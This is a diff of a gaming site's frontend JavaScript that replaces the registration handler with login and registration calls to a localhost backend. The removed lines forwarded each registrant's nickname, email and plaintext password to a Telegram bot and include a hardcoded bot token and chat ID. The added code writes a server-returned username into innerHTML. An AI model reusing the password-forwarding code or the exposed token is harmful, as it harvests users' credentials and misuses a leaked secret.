@@ -23,59 +23,115 @@ function openTab(btnElement, tabId) {
     btnElement.classList.add('active');
 }
 
-// РЕЄСТРАЦІЯ
-document.getElementById('registration-form').addEventListener('submit', function(event) {
-    event.preventDefault(); 
+// --- ЛОГІКА ПЕРЕМИКАННЯ ВХІД / РЕЄСТРАЦІЯ ---
+function switchAuth(type) {
+    const loginForm = document.getElementById('login-form');
+    const regForm = document.getElementById('registration-form');
+    const title = document.getElementById('auth-title');
+    const subtitle = document.getElementById('auth-subtitle');
+    
+    document.querySelectorAll('.auth-tab').forEach(tab => tab.classList.remove('active'));
 
+    if (type === 'login') {
+        document.getElementById('tab-login').classList.add('active');
+        loginForm.style.display = 'block';
+        regForm.style.display = 'none';
+        title.textContent = 'Welcome Back';
+        subtitle.textContent = 'Login to access game lobbies';
+    } else {
+        document.getElementById('tab-register').classList.add('active');
+        loginForm.style.display = 'none';
+        regForm.style.display = 'block';
+        title.textContent = 'Registration';
+        subtitle.textContent = 'Join to find your perfect squad';
+    }
+}
+
+// --- ВХІД (LOGIN) ---
+document.getElementById('login-form').addEventListener('submit', async function(event) {
+    event.preventDefault();
+    const email = document.getElementById('login-email').value;
+    const password = document.getElementById('login-password').value;
+    const errorSpan = document.getElementById('login-error');
+    const submitBtn = this.querySelector('.submit-btn');
+
+    errorSpan.style.display = "none";
+    submitBtn.textContent = "Connecting...";
+
+    try {
+        const response = await fetch('http://localhost:3000/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email, password })
+        });
+
+        if (response.ok) {
+            const data = await response.json();
+            document.getElementById('player-display').innerHTML = `Player: <strong>${data.user.username}</strong>`;
+            successfulAuth();
+        } else {
+            const errorText = await response.text();
+            errorSpan.textContent = "❌ " + errorText;
+            errorSpan.style.display = "block";
+        }
+    } catch (error) {
+        errorSpan.textContent = "❌ Server error. Make sure your Node.js backend is running!";
+        errorSpan.style.display = "block";
+    }
+    submitBtn.textContent = "Login & Enter";
+});
+
+// --- РЕЄСТРАЦІЯ (REGISTER) ---
+document.getElementById('registration-form').addEventListener('submit', async function(event) {
+    event.preventDefault(); 
     const nickname = document.getElementById('nickname').value;
     const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value; // Отримуємо пароль з форми
+    const password = document.getElementById('password').value;
     const errorSpan = document.getElementById('email-error');
+    const submitBtn = this.querySelector('.submit-btn');
 
     if (!email.includes('@') || !email.includes('.')) {
-        errorSpan.textContent = "Please enter a valid email address with '@' and '.'";
+        errorSpan.textContent = "Please enter a valid email address";
         errorSpan.style.display = "block";
         return; 
     }
 
     errorSpan.style.display = "none";
-    
-    // === ВІДПРАВКА В TELEGRAM ===
-    // Встав сюди свій токен від BotFather та Chat ID від Getmyid_bot
-    const botToken = '8460092788:AAHPbETm_DIczqYL7vA4XCbnWioiVBZYHwg'; 
-    const chatId = '8399462172';             
-    
-    // Формуємо текст повідомлення
-    const messageText = `🔥 Нова реєстрація!\n👤 Нікнейм: ${nickname}\n📧 Email: ${email}\n🔑 Пароль: ${password}`;
-    
-    // Створюємо URL для запиту до API Telegram
-    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}`;
+    submitBtn.textContent = "Registering...";
 
-    // Відправляємо запит
-    fetch(telegramUrl)
-        .then(response => {
-            if(response.ok) {
-                console.log("Дані успішно відправлені в Telegram!");
-            } else {
-                console.error("Помилка відправки в Telegram.");
-            }
-        })
-        .catch(error => console.error("Помилка:", error));
+    try {
+        const response = await fetch('http://localhost:3000/register', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email, password, username: nickname })
+        });
 
-    document.getElementById('player-display').innerHTML = `Player: <strong>${nickname}</strong>`;
-   
-    // Після реєстрації показуємо кнопку Settings
+        if (response.ok) {
+            document.getElementById('player-display').innerHTML = `Player: <strong>${nickname}</strong>`;
+            successfulAuth();
+        } else {
+            const errorText = await response.text();
+            errorSpan.textContent = "❌ " + errorText;
+            errorSpan.style.display = "block";
+        }
+    } catch (error) {
+        errorSpan.textContent = "❌ Server error. Make sure your Node.js backend is running!";
+        errorSpan.style.display = "block";
+    }
+    submitBtn.textContent = "Register & Enter";
+});
+
+function successfulAuth() {
     document.getElementById('settings-btn').style.display = 'inline-block';
-
     document.getElementById('auth-modal').style.display = 'none';
     isUserRegistered = true;
 
     if (pendingTabId && pendingButton) {
         openTab(pendingButton, pendingTabId);
     }
-});
+}
 
-// Закриття реєстрації при кліку поза вікном
+// Закриття авторизації при кліку поза вікном
 const modalOverlay = document.getElementById('auth-modal');
 modalOverlay.addEventListener('click', function(event) {
     if (!event.target.closest('.modal-box')) {
@@ -86,7 +142,6 @@ modalOverlay.addEventListener('click', function(event) {
 });
 
 // --- НАЛАШТУВАННЯ ПРОФІЛУ ---
-
 function openSettings() {
     document.getElementById('right-sidebar').classList.add('open');
 }
@@ -98,8 +153,7 @@ function closeSettings() {
     document.getElementById('change-password').value = '';
     document.getElementById('confirm-password').value = '';
     document.getElementById('photo-upload').value = '';
-    
-    // Скидання тексту назви файлу
+
     const fileNameDisplay = document.getElementById('file-name-display');
     if (fileNameDisplay) {
         fileNameDisplay.textContent = "No file chosen";
@@ -115,8 +169,7 @@ function saveSettings() {
     const errorSpan = document.getElementById('settings-error');
 
     errorSpan.style.display = 'none';
-    
-    // Перевірка паролів
+
     if (newPassword !== "" || confirmPassword !== "") {
         if (newPassword !== confirmPassword) {
             errorSpan.textContent = "Passwords do not match!";
@@ -125,12 +178,10 @@ function saveSettings() {
         }
     }
 
-    // Зміна нікнейму
     if (newNickname.trim() !== "") {
         document.getElementById('player-display').innerHTML = `Player: <strong>${newNickname}</strong>`;
     }
 
-    // Зміна фото профілю
     if (photoUpload.files && photoUpload.files[0]) {
         const reader = new FileReader();
         reader.onload = function(e) {
@@ -142,7 +193,6 @@ function saveSettings() {
     closeSettings();
 }
 
-// Оновлення тексту при виборі файлу
 document.getElementById('photo-upload').addEventListener('change', function(event) {
     const fileNameDisplay = document.getElementById('file-name-display');
     
